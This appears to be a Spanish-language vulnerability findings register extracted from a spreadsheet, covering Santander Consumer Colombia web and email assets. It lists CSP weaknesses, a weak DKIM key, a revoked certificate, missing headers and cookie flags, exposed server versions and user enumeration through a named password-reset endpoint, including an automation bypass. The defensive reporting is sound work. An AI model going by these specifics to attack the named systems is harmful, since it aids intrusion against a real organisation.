Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave "inseguras" ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico.
Directiva: script-src
Valor: 'unsafe-inline'
Directiva: script-src</t>
  </si>
  <si>
    <t>unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros.
Las listas de permitidos de host se pueden eludir con frecuencia. Considere utilizar "strict-dynamic" en combinación con nonces o hashes de CSP.</t>
  </si>
  <si>
    <t>La página intentó cargar un recurso que estaba bloqueado por la política CSP.
Se rechazó la carga de la hoja de estilo 'https://fonts.googleapis.com/css?family=Montserrat:100' porque infringe la siguiente directiva de la Política de seguridad de contenido: "style-src 'self' 'report-sample' 'unsafe-inline' tagmanager.google.com unpkg.com www.googletagmanager.com". Tenga en cuenta que 'style-src-elem' no se configuró explícitamente, por lo que 'style-src' se utiliza como alternativa.
Se negó a cargar el script 'https://www.google.com/recaptcha/api.js?render=6LcBbTYiAAAAAFbK3rSpWk2V8w315JvH7z9ycQbm' porque infringe la siguiente directiva de la Política de seguridad de contenido: "script-src 'self' 'report-sample' 'unsafe-inline' https://google-analytics.com https://googletagmanager.com https://ssl.google-analytics.com https://tagmanager.google.com https://unpkg.com https://www.google-analytics.com https://www.googletagmanager.com". Tenga en cuenta que 'script-src-elem' no se configuró explícitamente, por lo que 'script-src' se utiliza como respaldo.</t>
  </si>
  <si>
    <t>El tamaño de la clave pública es inferior a 2048 bits</t>
  </si>
  <si>
    <t>El tamaño de la clave pública es inferior a 2048 bits
Algorithm
RSA
Key Length
1024
DKIM Record
TXT
k=rsa; t=s; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCuMByOYo3aEWY2vhx2GoPusDQu5R4ZV2JhZe2nrWjmhGw8Foot+NzwrXL1RV3A9ZRjIaLQ1GJm5Mf1jUqwoC7aJ7SQCv4O2g37/qkiQBjVeFsVzxyB0TMwfFbKM6spkt42d3FU6KiA5HXdF/B6NoEdDfnP6cediFm5L0KgElSjvQIDAQAB</t>
  </si>
  <si>
    <t>Utilice la implementación de OpenSSL o SSL que prefiera para generar un nuevo par de claves y especifique una clave con una seguridad de 2048 bits o más en el momento de la generación. Implemente el par de claves más seguro en su configuración de DKIM.</t>
  </si>
  <si>
    <t>Política potencialmente insegura
Encabezados ineficaces: Content-Security-Policy</t>
  </si>
  <si>
    <t>Política potencialmente insegura
La implementación de estos encabezados no sigue las mejores prácticas de seguridad.
Directiva: script-src
Valor: "Unsafe-inline" es inseguro
Directiva: style-src
Valor: "Unsafe-inline"
Directiva: img-src
Valor: * Los asteriscos en la fuente son inseguros
Directiva: reporting-objective: No se utiliza ninguna directiva de notificación
Directiva: form-action-objective: Limitación de privilegios de la aplicación (Formulario-Acciones)
Directiva: code-injection-objective: Prevención limitada de inyección de código
https://mft.santanderconsumer.co/webclient/Login.xhtml</t>
  </si>
  <si>
    <t xml:space="preserve">Elimine todas las instancias de directivas "unsafe-" y fuentes "blob, data, filesystem". Asegúrese de que sus directivas CSP estén configuradas correctamente. Obtenga más información en W3C CSP .
Asegúrese de que los encabezados estén implementados correctamente, como se describe en RFC-7231 . Los encabezados no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente.
Elimina la palabra clave "unsafe-inline" de tu política de seguridad de contenido.
Elimine cualquier instancia del carácter asterisco (*) que se encuentre solo de su política de seguridad de contenido.
Incluya una directiva de informe con una ubicación o grupo válido.
Incluya la directiva form-actions en su CSP.
No utilice ninguna palabra clave "insegura" y utilice hosts explícitos para cualquier directiva de lista de fuentes.
</t>
  </si>
  <si>
    <t>Atributo de integridad faltante</t>
  </si>
  <si>
    <t>Atributo de integridad faltante
La página no incluye un atributo de integridad en la obtención de scripts entre dominios.
Recurso: https://www.googletagmanager.com/gtag/js?id=G-4W6ZMRLK1B&amp;l=dataLayer&amp;cx=c
https://www.googletagmanager.com/gtag/js?id=G-4W6ZMRLK1B
https://www.googletagmanager.com/gtag/js?id=G-5N7QGZ8B0M
https://unpkg.com/@popperjs/core@2
https://unpkg.com/tippy.js@6
Falta el atributo de integridad
https://www.google.com/recaptcha/api.js?render=6LcBbTYiAAAAAFbK3rSpWk2V8w315JvH7z9ycQbm</t>
  </si>
  <si>
    <t>Los propietarios de sitios web deben evitar cargar scripts de recursos de terceros, evitando la exposición a la manipulación de contenido y JavaScript por parte de terceros o en caso de una vulneración de la red. Si la carga de scripts de terceros es inevitable, se deben utilizar etiquetas de integridad de subrecursos siempre que sea posible. Para obtener más información, consulte: Integridad de subrecursos</t>
  </si>
  <si>
    <t xml:space="preserve">Esta Política de Seguridad de Contenido (CSP) tiene problemas que posiblemente la hagan insegura.
Directiva: script-src
Valor: “Unsafe-inline” es inseguro
Directiva: style-src
Valor: “Unsafe-inline” es inseguro
Directiva: img-src
Valor: “Blob” fuente insegura
Directiva: font-src
Valor: “Data” fuente insegura
Directiva: reporting-objective
Directiva: code-injection-objective
</t>
  </si>
  <si>
    <t>Asegúrese de que los encabezados estén implementados correctamente, como se describe en RFC-7231 . Los encabezados no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente.
Elimina la palabra clave "unsafe-inline" de tu política de seguridad de contenido.
Elimina "blob:" de la lista de fuentes en tu política de seguridad de contenido.
Elimina "datos:" de la lista de fuentes en tu política de seguridad de contenido.
reporting-objective Incluya una directiva de informe con una ubicación o grupo válido.
code-injection-objective No utilice ninguna palabra clave "insegura" y utilice hosts explícitos para cualquier directiva de lista de fuentes.</t>
  </si>
  <si>
    <t>Correos electronicos</t>
  </si>
  <si>
    <t>Certificate Is Revoked</t>
  </si>
  <si>
    <t>emaillink.santanderconsumer.co</t>
  </si>
  <si>
    <t>Cuando una autoridad de certificación (CA) emite un certificado, incorpora URL que se pueden utilizar para comprobar si se ha revocado un certificado. Los certificados revocados ya no son válidos y los clientes TLS (por ejemplo, los navegadores web) se negarán a conectarse a servidores que presenten certificados revocados. Los certificados se revocan por diversas razones: el desmantelamiento de un servidor, el retiro de un producto o nombre comercial, la renovación anticipada de un certificado de reemplazo o la creencia de que un atacante puede haber adquirido la clave privada correspondiente del certificado. La presencia de un certificado revocado en Internet es una indicación de que una organización carece de una política de gestión de certificados o no la cumple, o de que la organización ha sufrido una infracción que no se ha solucionado por completo.</t>
  </si>
  <si>
    <t>Si el servicio no está en uso, desactívelo. De lo contrario, comuníquese con la CA y solicite la emisión de un nuevo certificado.</t>
  </si>
  <si>
    <t>Los certificados revocados impiden que los clientes TLS se conecten a los servidores.</t>
  </si>
  <si>
    <t>MAN-67160b3196d088205b831aec</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-019-AP-001</t>
  </si>
  <si>
    <t>Evasión de mecanismo anti-automatización</t>
  </si>
  <si>
    <t>Durante las pruebas se ha identificado la posibilidad de enumerar usuarios de la aplicación a través del formulario de “¿Olvidaste tu contraseña?”, vulnerabilidad SCO-24-CNMPO-019-AP-002. Se intento automatizar dicha enumeración para evaluar el riesgo final de la misma, pero se identificó que al igual que para otras operaciones de la aplicación, el cuerpo de la peticiones es cifrado antes de su envío. Esto supone una dificultad variable cuando se trabaja a nivel del protocolo HTTP (herramienta proxy Burpsuite). El enfoque alternativo elegido para evadir la dificultad añadida de cifrar las peticiones ha sido subir al nivel de aplicación, controlando el navegador mediante la librería selenium en Python y  opcionalmente, haciendo pasar dicho navegador por la herramienta proxy para analizar las respuestas del servidor.
Mediante el script compartido al final, el navegador es controlado automatizando la tarea de probar una lista de nombres de usuario, a la par que la operación de cifrado es transparente para el atacante. La prueba de concepto se realizó sobre una lista total de solo 10 candidatos para no causar impacto en el entorno en producción.</t>
  </si>
  <si>
    <t>Se recomienda que los mecanismos desplegados, siempre tengan un componente del lado del
servidor, ya que del lado del cliente siempre será posible evadirlos con el suficiente tiempo. Para el
caso concreto de la prueba de concepto, al tratarse de un formulario de recordar clave, el 
mecanismo más efectivo es el correcto despliegue de un captcha.</t>
  </si>
  <si>
    <t>La posibilidad de poder evadir elemento de control anti-fuerzabruta abre la posibilidad de poder atacar formularios de la aplicación expuestos en la parte pública con mecanismos automatizados y múltiples finalidades como podrían ser enumeración de usuarios, ataques de diccionario contra cuentas enumeradas o denegación de servicio a través de formularios de contacto.</t>
  </si>
  <si>
    <t>1° Fecha: 31/01/2025</t>
  </si>
  <si>
    <t>MAN-671608a796d088205b831aeb</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-019-AP-002</t>
  </si>
  <si>
    <t>El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario es un usuario válido en el sistema o aplicación afectada.
Función: “¿Olvidaste tu contraseña?”
Método: POST //account/v1/account/generate_reset_code</t>
  </si>
  <si>
    <t>Se recomienda que el aplicativo no permita desvelar si un usuario está registrado en el sistema. Así mismo, se recomienda que el mecanismo de autenticación no proporcione evidencias que
permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error,
tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación. Siendo un mensaje
genérico de acceso incorrecto la mejor opción en estos casos.
En concreto una solución adecuada seria que independientemente de la existencia o no del usuario
la aplicación respondiera: ”Si su usuario está registrado, enviaremos un link de restablecimiento de
contraseña al correo electrónico registrado en el sistema”.</t>
  </si>
  <si>
    <t>Esta vulnerabilidad podría ser utilizada por un atacante para intentar obtener un listado de los usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de contraseñas, ataques de phishing, ataques de fuerza bruta o "password spraying" sobre las contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna cuenta de usuario o administrador.</t>
  </si>
  <si>
    <t>1° Fecha: 31/01/2025
2° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>MAN-672dd4a84475a96487b264b1</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-016-CO-001</t>
  </si>
  <si>
    <t>Ausencia de mecanismos de prevención contra ataques de fuerza bruta</t>
  </si>
  <si>
    <t xml:space="preserve">El formulario de autenticación de la aplicación carece de mecanismos que prevengan el envío masivo y automatizado de solicitudes, como un sistema CAPTCHA. Esto permite la posibilidad de que un usuario malintencionado intente repetidamente adivinar credenciales de acceso mediante un gran número de combinaciones posibles, lo que incrementa el riesgo de acceso no autorizado.
</t>
  </si>
  <si>
    <t>Para mitigar la vulnerabilidad de ausencia de mecanismos de protección contra ataques de fuerza bruta, se recomienda implementar mecanismos de prevención contra la automatización de peticiones, como la incorporación de un CAPTCHA, otras medidas de seguridad incrementarían la seguridad del activo, como:
• Limitación de intentos de autenticación: Implementar mecanismos que limiten el número de intentos de autenticación fallidos. Después de varios intentos fallidos, la cuenta debe ser bloqueada temporalmente o la dirección IP debe ser bloqueada.
• Autenticación multifactor (MFA): Habilitar la autenticación multifactor para todos los accesos a servicios críticos. Esto agrega una capa adicional de seguridad, requiriendo no solo la contraseña sino también una segunda forma de verificación.
• Monitoreo y alerta de actividades sospechosas: Implementar soluciones de monitoreo que detecten y alerten sobre intentos repetidos de autenticación fallida, permitiendo una respuesta rápida a posibles ataques de fuerza bruta.
• Políticas de contraseñas fuertes: Implementar políticas de contraseñas que requieran el uso de contraseñas fuertes y únicas, y fomentar el cambio periódico de contraseñas para reducir el riesgo de adivinanza de credenciales.
• Registro y auditoría: Mantener registros detallados de los intentos de autenticación y realizar auditorías regulares para identificar patrones inusuales que puedan indicar un ataque de fuerza bruta.
• Seguridad en la configuración de servicios: Asegurar que servicios como FTP, SSH o RDP estén configurados con las mejores prácticas de seguridad, incluyendo el uso de puertos no estándar y la deshabilitación de accesos innecesarios.</t>
  </si>
  <si>
    <t>La ausencia de protección contra automatización permite a un usuario malintencionado realizar ataques de fuerza bruta de manera eficaz, aumentando la probabilidad de obtener acceso no autorizado y exponiendo el sistema a potenciales accesos no autorizados, con los siguientes riesgos significativos:
• Acceso no autorizado: Obtener acceso no autorizado a servicios críticos mediante la adivinanza de credenciales, comprometiendo la seguridad del sistema.
• Compromiso de información sensible: Podrían visualizarse, modificarse o eliminarse información sensible, afectando la confidencialidad e integridad de los datos.
• Disminución del rendimiento del sistema: Los intentos repetidos y automáticos de autenticación pueden sobrecargar los servicios afectados, degradando su rendimiento y afectando la disponibilidad del sistema.
• Escalada de privilegios: Si un usuario malintencionado lograra acceder a una cuenta con bajos privilegios, podría intentar escalar privilegios para obtener acceso a áreas más críticas del sistema.
• Explotación adicional de vulnerabilidades: Un acceso inicial no autorizado puede ser utilizado como punto de partida para explotar otras vulnerabilidades dentro del sistema y extender el alcance del ataque.</t>
  </si>
  <si>
    <t>MAN-672dd4ec4475a96487b264b2</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-016-AP-002</t>
  </si>
  <si>
    <t>Múltiples sesiones simultáneas desde IPs y dispositivos distintos</t>
  </si>
  <si>
    <t>No existe un control del número de sesiones abiertas por cada usuario en la aplicación, lo que puede permitir abrir múltiples sesiones al mismo tiempo desde distintas IPs y dispositivos de forma simultánea. Generalmente se considera que un usuario legítimo sólo debería autenticarse en la aplicación una vez de forma simultánea, ya que un usuario malicioso, si consiguiera su cookie de sesión, podría acceder a su panel personal y realizar cualquier tipo de acción sin su consentimiento y sin que este se percatara.</t>
  </si>
  <si>
    <t>Es decisión del diseño de la aplicación determinar si se permiten múltiples conexiones simultáneas del mismo usuario desde diferentes direcciones IP o dispositivos. Si la aplicación no desea permitir el inicio de sesión simultáneo, debe realizar acciones efectivas después de cada nuevo evento de autenticación, finalizando implícitamente la sesión previamente disponible, o preguntando al usuario (a través de las sesiones antiguas, nuevas o ambas) sobre la sesión que debe permanecer activa. Se recomienda desactivar dicha característica en caso de no ser necesaria.</t>
  </si>
  <si>
    <t>Si un usuario malintencionado consiguiera la cookie de sesión de un usuario legítimo, podría acceder a su panel personal y realizar cualquier tipo de acción sin su consentimiento y sin que este se percatara.</t>
  </si>
  <si>
    <t>MAN-673f4c6a86437e5a65e31bd6</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-001</t>
  </si>
  <si>
    <t>CVE-2021-44790
CVE-2021-40438
CVE-2021-33193
CVE-2021-33196
CVE-2021-37411
CVE-2021-36160
CVE-2019-0211
CVE-2017-15710
CVE-2018-1303
CVE-2017-15715
CVE-2016-8743
CVE-2019-0211</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha observado cómo la aplicación devuelve información relativa sobre el servidor y la versión.
Esta información es mostrada en la respuesta procedentes del servidor</t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas, así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-673f4cb686437e5a65e31bd7</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-002</t>
  </si>
  <si>
    <t>MAN-673f4cf886437e5a65e31bd8</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-AP-003</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "HttpOnly". De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). 
La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>MAN-673f4dd986437e5a65e31bea</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-AP-004</t>
  </si>
  <si>
    <t>Enumeración de directorios</t>
  </si>
  <si>
    <t>La vulnerabilidad de enumeración de directorios ocurre cuando un servidor web permite ver el contenido de directorios, exponiendo archivos sensibles. Esto facilita a los atacantes identificar recursos importantes, como configuraciones o scripts vulnerables. La prevención incluye deshabilitar el listado de directorios y proteger archivos con permisos adecuados.</t>
  </si>
  <si>
    <t>Se recomienda evitar que el servidor web devuelva información de la existencia o no de un determinado directorio basándose en las respuestas de error o en los códigos HTTP de respuesta.</t>
  </si>
  <si>
    <t>Un atacante podría enumerar la existencia de determinados directorios en el sistema objetivo con la finalidad de averiguar si se encuentran instalados en el sistema ciertos componentes o librerías que le ayuden a diseñar ataques más específicos contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-673f4e1c86437e5a65e31bf9</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-005</t>
  </si>
  <si>
    <t>La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página.
Se ha detectado que los activos no contienen la cabecera Content-Security-Policy.</t>
  </si>
  <si>
    <t>Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos. Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera HTTP Content-Security-Policy. 
Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran parte de las capacidades de seguridad de la cabecera. 
Un ejemplo de configuración de cabecera es el siguiente: 
· Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: 
· &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;</t>
  </si>
  <si>
    <t>MAN-673f519e86437e5a65e31da0</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-006</t>
  </si>
  <si>
    <t>Ausencia de cabecera Permission-Policy</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador.
Se ha detectado que los activos no contienen la cabecera Permission-Policy</t>
  </si>
  <si>
    <t>Se recomienda configurar la cabecera y deshabilitar todas las funciones que el dominio no necesite o permitir sólo a los dominios autorizados: 
Permissions-Policy: geolocation=() camera=(), microphone=() 
NOTA: Este ejemplo deshabilita la geolocalización, la cámara y el micrófono para todos los dominios.</t>
  </si>
  <si>
    <t>La ausencia de la cabecera Permissions-Policy podría permitir a un atacante abusar de algún tipo de inyección, por ejemplo, un XSS, para activar la cámara, el micrófono u otra característica del navegador.</t>
  </si>
  <si>
    <t>MAN-673f51ed86437e5a65e31dc0</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-007</t>
  </si>
  <si>
    <t>MAN-673f52d586437e5a65e31e1a</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-008</t>
  </si>
  <si>
    <t>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
Se ha detectado que los activos no contienen la cabecera Cross-Origin-Embedder-Policy.</t>
  </si>
  <si>
    <t>Se recomienda que un documento sólo pueda cargar recursos del mismo origen, o recursos marcados explícitamente como cargables desde otro origen.</t>
  </si>
  <si>
    <t>Un atacante puede incrustar recursos de otro origen, con el objetivo de obtener información sobre ellos explotando vulnerabilidades del tipo cross-site leaks.</t>
  </si>
  <si>
    <t>MAN-673f533986437e5a65e31e53</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-009</t>
  </si>
  <si>
    <t>MAN-673f556486437e5a65e32a3f</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-010</t>
  </si>
  <si>
    <t>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
Se ha detectado que los activos no contienen la cabecera Cross-Origin-Resource-Policy.</t>
  </si>
  <si>
    <t>Se recomienda limitar la carga de recursos actuales sólo al dominio y a los subdominios.</t>
  </si>
  <si>
    <t>El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de side-channel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre.</t>
  </si>
  <si>
    <t>MAN-673f557e86437e5a65e32a80</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-011</t>
  </si>
  <si>
    <t>MAN-673f55d586437e5a65e32b28</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-012</t>
  </si>
  <si>
    <t>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
Se ha detectado que los activos no contienen la cabecera Cross-Origin-Opener-Policy.</t>
  </si>
  <si>
    <t>Se recomienda aislar el contexto de navegación exclusivamente a los documentos del mismo origen. HTTP Cross-Origin-Opener-Policy: same-origin</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar esta vulnerabilidad para realizar acciones maliciosas como por ejemplo clickjacking, phishing, inyecciones de código o ataques de XSS.</t>
  </si>
  <si>
    <t>MAN-673f55f186437e5a65e32b6e</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-013</t>
  </si>
  <si>
    <t>MAN-673f562886437e5a65e32bc9</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-AP-014</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito.
Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta "Set-Cookie" de la cookie ‘JSESSIONID’ el atributo “Secure”.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "secure". De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados. 
La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>MAN-673f566386437e5a65e32c47</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-015</t>
  </si>
  <si>
    <t>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(Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques.
Durante las pruebas realizadas se ha observado que el servidor que aloja el dominio web es vulnerables a Lucky13.</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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MAN-673f568486437e5a65e32c8e</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-017-CO-016</t>
  </si>
  <si>
    <t>MAN-6750184e86437e5a65e47f2d</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-001</t>
  </si>
  <si>
    <t>La cabecera X-Frame-Options se puede utilizar para indicar si se debe permitir o no que un
navegador muestre una página en un formato, &lt;frame&gt;. Los sitios pueden utilizar esto para evitar
ataques de clickjacking , al garantizar que su contenido no esté incrustado en otros
sitios.&lt;iframe&gt;&lt;embed&gt;&lt;object&gt;.
Se ha detectado que los activos no contienen la cabecera X-Frame-Options.</t>
  </si>
  <si>
    <t>Se debe configurar el servidor web para incluir un encabezado “X-FRAME-OPTIONS”. Consulte las referencias Web para obtener más información acerca de los posibles valores de esta configuración.</t>
  </si>
  <si>
    <t>El servidor no devuelve un encabezado “X-Frame-Options”, lo cual significa que este sitio web puede estar en riesgo de un ataque de clickjacking. El encabezado de respuesta “HTTP X-Frame-Options” puede utilizarse para indicar al navegador si debe permitir o no renderizar una página dentro de un marco o un iframe. Algunos sitios pueden usar esto para evitar ataques de clickjacking, asegurando que su contenido no se embebe en otros sitios.</t>
  </si>
  <si>
    <t>MAN-6750189d86437e5a65e47f2e</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-002</t>
  </si>
  <si>
    <t>Ausencia de cabecera X-Content-Type-Options</t>
  </si>
  <si>
    <t>La cabecera HTTP de respuesta "X-Content-Type-Options" previene que el navegador interprete código HTML que esté incrustado en otros formatos de fichero como, por ejemplo, ficheros JSON. Esto permitiría a un atacante que tuviera la posibilidad de subir contenido al servidor, a subir un archivo malicioso (por ejemplo, con código JavaScript) utilizando una extensión considerada inofensiva (.jpg). Al no estar configurado el encabezado de seguridad en cuestión, un usuario podría acceder al archivo malicioso, sin advertir que el navegador podría inferir el tipo de contenido como “text/javascript” y ejecutar el código malicioso.
Se ha detectado que los activos no contienen la cabecera X-Content-Type-Options.</t>
  </si>
  <si>
    <t>Establezca el encabezado Content-Type correctamente en todo el sitio. X-Content-Type-Options: nosniff</t>
  </si>
  <si>
    <t>Sin la cabecera "X-Content-Type-Options", si la respuesta contiene un tipo MIME desconocido para el navegador, algunos navegadores tratarán de interpretar su contenido. Si un atacante puede inyectar su código malicioso (HTML, JavaScript) en la respuesta, cuando el navegador "rastrea" el contenido, lo identificará como "text/html" y ejecutará el payload malicioso El riesgo se mitiga por el hecho de que este tipo de ataque funciona solo en un número limitado de navegadores.</t>
  </si>
  <si>
    <t>MAN-67501c2086437e5a65e47f2f</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-003</t>
  </si>
  <si>
    <t>La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las
capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples
ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página.
Se ha detectado que los activos no contienen la cabecera Content-Security-Policy.</t>
  </si>
  <si>
    <t>Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos. Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera HTTP Content-Security-Policy. 
Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran parte de las capacidades de seguridad de la cabecera. 
Un ejemplo de configuración de cabecera es el siguiente: 
· Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: · &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>MAN-67501f1886437e5a65e47f31</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-004</t>
  </si>
  <si>
    <t>El encabezado Referrer-policy es un encabezado de solicitud que indica el sitio del que proviene el tráfico. Si no existe una prevención adecuada, la URL en sí misma, e incluso la información confidencial contenida en la URL, se filtrará al sitio cruzado. La falta de cabecera de la política de referencias puede afectar a la privacidad de los usuarios y del propio sitio.
Se ha detectado que los activos no contienen la cabecera Referrer-Policy.</t>
  </si>
  <si>
    <t>Se recomienda, siempre que sea posible, marcar el atributo “Referrer-Policy” como no-refe</t>
  </si>
  <si>
    <t>Si no hay medidas de prevención implementadas, la propia URL e incluso la información sensible que contiene la URL se filtrará al dominio cruzado. La ausencia de la cabecera Referrer-Policy podría afectar a la privacidad de los usuarios y del propio sitio</t>
  </si>
  <si>
    <t>MAN-6750211e86437e5a65e48ea1</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-005</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador.
Se ha detectado que los activos no contienen la cabecera Permission-Policy.</t>
  </si>
  <si>
    <t>MAN-6750214d86437e5a65e48ea2</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-006</t>
  </si>
  <si>
    <t>MAN-6750217d86437e5a65e48ea3</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-007</t>
  </si>
  <si>
    <t>El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de side-channel, así como los ataques de Cross-Site Scripting. 
Esta política es la única forma de proteger las imágenes de ataques Spectre.</t>
  </si>
  <si>
    <t>MAN-675021a986437e5a65e48ea4</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-008</t>
  </si>
  <si>
    <t>MAN-675021de86437e5a65e48ea5</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-018-CO-009</t>
  </si>
  <si>
    <t>Metadatos en documentos</t>
  </si>
  <si>
    <t>Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden proporcionar información interna de la organización, tales
como nombres de empleados, códigos de usuario o versiones de software.
Tiene un CVE-2017-9096 que está relacionado con una vulnerabilidad detectada en la biblioteca de generación de documentos PDF iText 2.1.7, ampliamente utilizada para crear y manipular archivos PDF. Esta vulnerabilidad se clasifica como una exposición de información sensible y surge debido a un comportamiento inseguro al procesar archivos PDF.</t>
  </si>
  <si>
